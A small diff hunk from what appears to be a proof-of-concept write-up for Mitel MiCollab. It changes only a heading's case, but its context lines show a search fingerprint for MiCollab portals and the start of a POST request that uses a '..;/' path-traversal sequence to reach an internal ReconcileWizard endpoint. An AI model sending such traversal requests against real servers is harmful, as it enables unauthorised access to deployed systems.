@@ -8,7 +8,7 @@
 body="MiCollab End User Portal"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
